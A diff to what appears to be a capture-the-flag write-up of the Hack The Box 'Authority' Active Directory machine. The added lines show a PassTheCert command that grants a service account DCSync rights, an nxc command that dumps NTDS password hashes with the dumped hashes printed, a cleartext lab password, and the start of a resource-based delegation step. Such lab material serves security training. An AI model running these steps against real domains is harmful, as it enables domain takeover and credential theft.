@@ -843,6 +843,10 @@ memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=ht
 
 
 
+{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc1#esc1-linux-machine-account" %}
+
+
+
 ```bash
 ❯ powerview authority.htb/'svc_ldap':'lDaP_1n_th3_cle4r!'@10.10.11.222 --dc-ip 10.10.11.222
 Logging directory is set to /home/kali/.powerview/logs/authority-svc_ldap-10.10.11.222
@@ -1059,6 +1063,39 @@ ecfaaf85b2859960b8313f78b73cd39e
 ```
 
 
+
+otra
+
+```bash
+❯ python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Granted user 'svc_ldap' DCSYNC rights!
+```
+
+
+
+```bash
+❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ntds
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
+SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+SMB         10.10.11.222    445    AUTHORITY        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         10.10.11.222    445    AUTHORITY        [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.222    445    AUTHORITY        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+SMB         10.10.11.222    445    AUTHORITY        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+SMB         10.10.11.222    445    AUTHORITY        AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:addf932778c269fb8c1a60e722569258:::
+SMB         10.10.11.222    445    AUTHORITY        [+] Dumped 5 NTDS hashes to /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds of which 4 were added to the database
+SMB         10.10.11.222    445    AUTHORITY        [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.10.11.222    445    AUTHORITY        [*] cat /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         10.10.11.222    445    AUTHORITY        [*] grep -iv disabled /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds | cut -d ':' -f1
+```
+
+
+
+RBCD
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action add_computer -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -computer-name 'rbcd_gzzcoo$' -computer-pass 'Gzzcoo123'
